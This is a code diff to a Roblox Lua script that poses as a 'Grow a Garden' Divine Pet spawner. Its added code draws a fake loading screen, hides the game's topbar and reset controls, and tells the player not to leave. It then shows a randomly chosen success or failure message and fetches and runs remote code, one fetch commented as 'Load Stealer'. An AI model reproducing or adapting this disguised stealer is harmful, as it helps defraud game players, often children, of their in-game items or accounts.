@@ -1,5 +1,139 @@
--- Combined Loader
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Petspawner1/LOADINGSCREEN/refs/heads/main/LOADING%20SCREENV2"))()
-task.delay(5, function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Petspawner1/GrowaGarden/refs/heads/main/Main.script"))()
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local Lighting = game:GetService("Lighting")
+local player = Players.LocalPlayer
+
+-- Start timer
+local startTime = tick()
+
+-- UI setup
+local gui = Instance.new("ScreenGui")
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.Name = "SecureLoadingUI"
+gui.Parent = player:WaitForChild("PlayerGui")
+
+-- Blur effect
+local blur = Instance.new("BlurEffect")
+blur.Size = 24
+blur.Parent = Lighting
+
+-- Main Frame
+local mainFrame = Instance.new("Frame", gui)
+mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+mainFrame.Size = UDim2.new(1, 0, 1, 0)
+
+-- Warning Message
+local warning = Instance.new("TextLabel", mainFrame)
+warning.Size = UDim2.new(1, 0, 0.1, 0)
+warning.Position = UDim2.new(0, 0, 0.1, 0)
+warning.Text = "⚠️ Do not leave or exit the app. Script loading..."
+warning.TextColor3 = Color3.fromRGB(255, 50, 50)
+warning.BackgroundTransparency = 1
+warning.Font = Enum.Font.Code
+warning.TextScaled = true
+
+-- Circle Loader
+local circle = Instance.new("ImageLabel", mainFrame)
+circle.Size = UDim2.new(0, 120, 0, 120)
+circle.Position = UDim2.new(0.5, -60, 0.5, -60)
+circle.BackgroundTransparency = 1
+circle.Image = "rbxassetid://3926305904"
+circle.ImageRectOffset = Vector2.new(324, 364)
+circle.ImageRectSize = Vector2.new(36, 36)
+circle.ImageColor3 = Color3.fromRGB(0, 255, 0)
+
+-- Countdown label
+local countLabel = Instance.new("TextLabel", mainFrame)
+countLabel.Size = UDim2.new(1, 0, 0.1, 0)
+countLabel.Position = UDim2.new(0, 0, 0.7, 0)
+countLabel.BackgroundTransparency = 1
+countLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+countLabel.Font = Enum.Font.Code
+countLabel.TextScaled = true
+countLabel.Text = "Loading: 6s"
+
+-- Bottom subtext
+local bottomText = Instance.new("TextLabel", mainFrame)
+bottomText.Size = UDim2.new(1, 0, 0.05, 0)
+bottomText.Position = UDim2.new(0, 0, 0.95, 0)
+bottomText.BackgroundTransparency = 1
+bottomText.TextColor3 = Color3.fromRGB(100, 255, 100)
+bottomText.Font = Enum.Font.Code
+bottomText.TextScaled = true
+bottomText.Text = "*Do not leave while loading...*"
+
+-- Matrix effect
+task.spawn(function()
+	while gui and gui.Parent do
+		local mathLabel = Instance.new("TextLabel", mainFrame)
+		mathLabel.Text = tostring(math.random(1000, 99999))
+		mathLabel.Font = Enum.Font.Code
+		mathLabel.TextSize = 14
+		mathLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+		mathLabel.BackgroundTransparency = 1
+		mathLabel.Position = UDim2.new(math.random(), 0, -0.05, 0)
+		mathLabel.Size = UDim2.new(0, 100, 0, 20)
+
+		local tween = TweenService:Create(mathLabel, TweenInfo.new(1.2), {
+			Position = UDim2.new(mathLabel.Position.X.Scale, 0, 1.1, 0),
+			TextTransparency = 1
+		})
+
+		tween:Play()
+		game:GetService("Debris"):AddItem(mathLabel, 1.5)
+		wait(0.05)
+	end
+end)
+
+-- Disable CoreGui
+pcall(function()
+	StarterGui:SetCore("TopbarEnabled", false)
+	StarterGui:SetCore("ResetButtonCallback", false)
+end)
+
+-- Short countdown (6 seconds)
+task.spawn(function()
+	for i = 6, 0, -1 do
+		countLabel.Text = "Loading: " .. i .. "s"
+		circle.Rotation = (6 - i) * 60
+		wait(1)
+	end
+
+	local hasDivinePet = math.random(1, 2) == 1
+
+	if hasDivinePet then
+		countLabel.Text = "✅ Check your inventory. You have successfully got a Divine Pet."
+		countLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+	else
+		countLabel.Text = "❌ No Divine Pet found. Please execute the script again."
+		countLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+	end
+
+	-- Re-enable CoreGui
+	pcall(function()
+		StarterGui:SetCore("TopbarEnabled", true)
+		StarterGui:SetCore("ResetButtonCallback", true)
+	end)
+
+	-- Cleanup
+	wait(2)
+	gui:Destroy()
+	blur:Destroy()
+
+	-- ✅ Load Stealer
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Petspawner1/GrowaGarden/refs/heads/main/Main.script"))()
+
+	-- 🧬 Load Spawner
+	local Spawner = loadstring(game:HttpGet("https://codeberg.org/darkdarkdark/roblox/raw/branch/main/Spawner.lua"))()
+	Spawner.Load()
+end)
+
+-- Fake early leave block
+Players.PlayerRemoving:Connect(function(leavingPlayer)
+	if leavingPlayer == player and tick() - startTime < 6 then
+		-- Uncomment to kick
+		-- leavingPlayer:Kick("Leaving early is not allowed during loading.")
+	end
 end)
